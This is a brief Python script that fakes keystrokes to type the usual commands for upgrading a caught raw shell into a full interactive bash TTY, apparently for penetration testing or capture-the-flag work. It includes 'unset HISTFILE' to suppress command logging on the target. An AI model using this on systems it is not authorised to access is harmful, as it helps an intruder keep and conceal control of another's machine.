#!/usr/bin/env python3
from pynput.keyboard import Key, Controller
from pynput import keyboard
import time, sys

#types out the commands needed to upgrade the shell
def upgrade():
	#takes care of pressing the enter key after each command is typed out
	def ent():
		time.sleep(0.3)
		kb.press(Key.enter)
		kb.release(Key.enter)

	kb=Controller()
	time.sleep(1)
	ent()
	kb.type("unset HISTFILE")
	ent()
	kb.type("""python -c '\''import pty; pty.spawn("/bin/bash")'\'' || python3 -c '\''import pty; pty.spawn("/bin/bash")'\'' || script -qc /bin/bash /dev/null""")
	ent()
	kb.press(Key.ctrl)
	kb.press("z")
	kb.release("z")
	kb.release(Key.ctrl)
	kb.type("stty size | xclip -selection clipboard")
	ent()
	kb.type("stty raw -echo; fg")
	ent()
	kb.type("unset HISTFILE")
	ent()
	kb.type("export SHELL=bash")
	ent()
	kb.type("export TERM=xterm-256color")
	ent()
	kb.type("stty cols $(xclip -o -selection clipboard | awk '{print $2}') rows $(xclip -o -selection clipboard | awk '{print $1}')")
	ent()
	kb.type("reset")
	ent()
	kb.type("exec /bin/bash")
	ent()
	kb.type("clear")
	ent()
	kb.type("UPGRADE SUCCESSFUL!")
upgrade()
